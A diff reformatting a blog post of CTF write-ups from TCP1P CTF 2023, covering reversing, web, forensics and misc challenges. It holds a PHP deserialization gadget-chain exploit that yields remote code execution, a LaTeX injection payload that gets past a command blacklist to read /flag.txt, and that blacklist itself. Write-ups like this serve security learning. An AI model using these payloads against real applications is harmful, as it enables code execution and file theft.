@@ -13,6 +13,7 @@ tag:
 Last week, i participated in "TCP1P CTF 2023 - First Step Beyond Nusantara" with the ACTFA (Amikom CTF Affiliation) University team and managed to solve several challenges. I've written quick write-ups for all the challenges I solved.
 
 ### **Take Some Byte - Reversing**
+
 **Challenge Description:**\
 `I think some code is need some effort to read`\
 `Author: omegathrone`
@@ -217,7 +218,9 @@ This assembly code assigns values to the list variable "flag" based on certain c
         >>  342 LOAD_CONST               0 (None)
             344 RETURN_VALUE
 ```
+
 **Solver:**
+
 ``` python
 flag = [x for x in range(25)]
 # 15           0 LOAD_FAST                0 (flag)
@@ -402,10 +405,13 @@ flag[22] = flag[0].lower()
 flag[23] = flag[22]
 print(''.join(flag))
 ```
-Run the solver and got the flag!\
+
+Run the solver and got the flag!
+
 **Flag:** TCP1P{byte_code_is_HuFtt}
 
 ### **Subject Encallment - Reversing**
+
 **Challenge Description:**\
 `If there's something strange. In your neighborhood. Who you gonna call?`\
 `Author: Kisanak`
@@ -414,20 +420,29 @@ Run the solver and got the flag!\
 Upon decompiling using IDA Pro, it was found that the code runs the 'secretFunction' function, but there's no call to 'flag' within it. 
 Let's check the other available functions. There's a 'printFlag' function that runs the 'phase1-14' functions. The 'phase1-14' functions are used for key assignments. 
 The flag is then obtained through XOR operations using the keys acquired. Since the 'phase1-14' functions automatically assign the keys, you just need to call 'printFlag'. 
-This can be done using the **'jump <address of the printFlag function>'** method in GDB. Before jump to printFlag, you need to set breakpoint on main function with command **'b *main'**.\
+This can be done using the **'jump <address of the printFlag function>'** method in GDB. Before jump to printFlag, you need to set breakpoint on main function with command **'b *main'**.
+
 **Main Function:**
-![Main Function](/images/post/TCP1PCTF2023_SubjectEncallment1.png)
+![Main Function](images/TCP1PCTF2023_SubjectEncallment1.png)
+
 **Secret Function:**
-![Secret Function](/images/post/TCP1PCTF2023_SubjectEncallment2.png)
+![Secret Function](images/TCP1PCTF2023_SubjectEncallment2.png)
+
 **printFlag Function:**\
-![printFlag Function](/images/post/TCP1PCTF2023_SubjectEncallment3.png)
+![printFlag Function](images/TCP1PCTF2023_SubjectEncallment3.png)
+
 **Solver:**
-![Flag](/images/post/TCP1PCTF2023_SubjectEncallment4.png)
+![Flag](images/TCP1PCTF2023_SubjectEncallment4.png)
+
 **Flag:** TCP1P{here_my_number_so_call_me_maybe}
 
 ### **Un Secure - Web**
+
 **Challenge Description:**\
-`Do you know what "unserialize" means? In PHP, unserialize is something that can be very dangerous, you know? It can cause Remote Code Execution. And if it's combined with an autoloader like in Composer, it can use gadgets in the autoloaded folder to achieve Remote Code Execution.`
+`Do you know what "unserialize" means? In PHP, unserialize is something`
+`that can be very dangerous, you know? It can cause Remote Code Execution.`
+`And if it's combined with an autoloader like in Composer, it can use`
+`gadgets in the autoloaded folder to achieve Remote Code Execution.`
 `http://ctf.tcp1p.com:45678`
 `Author: Dimas`
 
@@ -438,7 +453,9 @@ Given the source code, it's observed that the 'index.php' file calls the 'unseri
 3. File 'Echoers.php': there's a '__destruct()' function with 'echo get_x()' inside it.
 
 We can utilize these three gadgets to achieve Remote Code Execution (RCE). The 'Vuln' Gadget is wrapped by the 'Adders' Gadget, which, in turn, is wrapped by the 'Echoers' Gadget to trigger the '__toString()' 'eval' function in the 'Vuln' Gadget.\
+
 **Index.php:**
+
 ``` php
 <?php
 require("vendor/autoload.php");
@@ -450,7 +467,9 @@ if (isset($_COOKIE['cookie'])) {
 
 echo "Welcome to my web app!";
 ```
+
 **GadgetOne\Adders.php:**
+
 ``` php
 <?php
 
@@ -469,7 +488,9 @@ namespace GadgetOne {
     }
 }
 ```
+
 **GadgetTwo\Echoers.php:**
+
 ``` php
 <?php
 
@@ -485,7 +506,9 @@ namespace GadgetTwo {
     }
 }
 ```
+
 **GadgetThree\Vuln.php:**
+
 ``` php
 <?php
 
@@ -512,9 +535,13 @@ namespace GadgetThree {
     }
 }
 ```
+
 **Solver:**\
+
 To gain RCE, i modify this Gadget and create exploit. I also added a function '__construct()' to the Gadget Echoers to capture parameters when the class is defined, and then turned it into a variable so that it can be used by functions within the class.\
+
 **GadgetTwo\Echoers.php:**
+
 ``` php
 <?php
 
@@ -535,7 +562,9 @@ namespace GadgetTwo {
     }
 }
 ```
+
 **GadgetThree\Vuln.php:**
+
 ``` php
 <?php
 
@@ -553,7 +582,9 @@ namespace GadgetThree {
     }
 }
 ```
+
 **Exploit.php:**
+
 ```php
 <?php
 
@@ -569,19 +600,26 @@ echo var_dump($serialize);
 
 ?>
 ```
+
 Generate the serialized cookie, and set to website's cookie **cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9...**, refresh page and got RCE!.
-![Flag](/images/post/TCP1PCTF2023_UnSecure1.png)
+
+![Flag](images/TCP1PCTF2023_UnSecure1.png)
+
 **Flag:** TCP1P{unserialize in php go brrrrrrrr ouch}
 
 ### **Latex - Web**
+
 **Challenge Description:**\
-`My first LaTeX website for my math teacher. I hope this will become the best gift for him! :)`\
+`My first LaTeX website for my math teacher.`
+`I hope this will become the best gift for him! :)`\
 `http://ctf.tcp1p.com:52132`\
 `Author: Dimas`
 
 **Analysis:**\
 Latex is vulnerable to injection, but there's a blacklist of LaTeX commands like the ones below. Here, you can bypass it using \newtoks, which is used for token register. Then, you simply assign a value to that registered token. I have worked on this Latex problem before on the Hackthebox machine Topology and the UMDCTF 2023 Homework challenge. By the way, I forgot where I got this payload from, and I saved it for future needs. Respect to whoever created this payload before.\
+
 **Main.go - Blacklisted Command:**
+
 ``` go
 var (
 	//go:embed static/*
@@ -592,7 +630,9 @@ var (
 		"openout", "newcommand", "expandafter", "csname", "endcsname", "^^"}
 )
 ```
+
 **Solver:**
+
 ``` text
 \documentclass{article}
 \RequirePackage{verbatim}
@@ -605,9 +645,11 @@ var (
 \begin{verbatim\the\in\the\put}{/flag.txt}\end{verbatim\the\in\the\put}
 \end{document}
 ```
+
 **Flag:** TCP1P{bypassing_latex_waf_require_some_latex_knowledge}
 
 ### **A Simple Website - Web**
+
 **Challenge Description:**\
 `It turns out that learning to make websites using NuxtJS is really fun`
 `http://ctf.tcp1p.com:45681`
@@ -624,11 +666,14 @@ RUN git clone https://github.com/nuxt/framework.git /app && \
 # Start the Nuxt.js development server
 CMD ["pnpm", "run", "dev", "--host", "0.0.0.0"]
 ```
-**Solver:**\
-![Flag](/images/post/TCP1PCTF2023_ASimpleWebsite1.png)
+**Solver:**
+
+![Flag](images/TCP1PCTF2023_ASimpleWebsite1.png)
+
 **Flag:** TCP1P{OuTD4t3d_NuxxT_fR4m3w0RkK}
 
 ### **Hide and Split - Forensic**
+
 **Challenge Description:**\
 `Explore this disk image file, maybe you can find something hidden in it.`\
 `Author: underzero`
@@ -636,16 +681,17 @@ CMD ["pnpm", "run", "dev", "--host", "0.0.0.0"]
 **Analysis:**\
 Given a file of an NTFS DOS/MBR boot sector, simply extract it using 7z to reveal its contents. After extracting, you'll find files named flag[0-9].txt, as well as files named flag[0-9].txt:flag[0-9]. Examine the file flag01.txt; it contains hexadecimal data, and after decoding, it appears to be a file signature from a PNG file. Since this is likely a split PNG file, the next step is to combine all the hex data and convert it into a PNG.\
 
-![Flag Split](/images/post/TCP1PCTF2023_hideandsplit1.png)
+![Flag Split](images/TCP1PCTF2023_hideandsplit1.png)
 
 **Solver:**\
 Simply read the flag[0-9].txt:flag[0-9] file and convert to png with command **'cat *:flag* | xxd -r -p > flag.png'**.
 
-![Flag](/images/post/TCP1PCTF2023_hideandsplit2.png)
+![Flag](images/TCP1PCTF2023_hideandsplit2.png)
 
 **Flag:** TCP1P{hidden_flag_in_the_extended_attributes_fea73c5920aa8f1c}
 
 ### **zipzipzip - Misc**
+
 **Challenge Description:**\
 `unzip me pls`
 `Author: botanbell`
@@ -654,6 +700,7 @@ Simply read the flag[0-9].txt:flag[0-9] file and convert to png with command **'
 Because the file is named zip-25000.zip and contains a file named password.txt, it's clear that this is a zip within a zip. This means you'll need to extract 25,000 zips with different passwords. So, we need to create automation script.\
 
 **Solver:**
+
 ``` python
 import os
 import subprocess
@@ -663,16 +710,20 @@ for i in range(25000, 0, -1):
     os.system(f"7z x zip-{i}.zip -P'{passw}' -aoa")
     os.system(f"rm -rf zip-{i}.zip")
 ```
+
 **Flag:** TCP1P{1_TH1NK_U_G00D_4T_SCR1PT1N9_botanbell_1s_h3r3^_^}
 
 ### **Guess My Number - Misc**
+
 **Challenge Description:**\
-`My friend said if i can guess the right number, he will give me something. Can you help me?`
+`My friend said if i can guess the right number, he will give me something.`
+`Can you help me?`
 `nc ctf.tcp1p.com 7331`
 `Author: rennfurukawa`
 
 **Analysis:**\
 Decompile the guess file using IDA Pro. It's known that to obtain the flag, our input must match -889275714 after addition and XOR operations. For v1, it's a random number with a given seed. So, you just need to create a program that generates the same number with the same seed, then add 1337331 to it and XOR it with -889275714. The result will be the correct input, and you'll obtain the flag.
+
 ``` c
 int vuln()
 {
@@ -693,12 +744,12 @@ int vuln()
   return puts("Wrong, Try again harder!");
 }
 ```
-**Solver:**
-![Random Number](/images/post/TCP1PCTF2023_GuessMyNumber1.png)
-![flag](/images/post/TCP1PCTF2023_GuessMyNumber2.png)
 
-**Flag:**\
-TCP1P{r4nd0m_1s_n0t_th4t_r4nd0m_r19ht?_946f38f6ee18476e7a0bff1c1ed4b23b}
+**Solver:**
+![Random Number](images/TCP1PCTF2023_GuessMyNumber1.png)
+![flag](images/TCP1PCTF2023_GuessMyNumber2.png)
+
+**Flag:**: TCP1P{r4nd0m_1s_n0t_th4t_r4nd0m_r19ht?_946f38f6ee18476e7a0bff1c1ed4b23b}
 
 Thank you for reading this article, i hope it was helpful :-D\
 **Follow me on: [Linkedin], [Medium], [Github], [Youtube], [Instagram]**
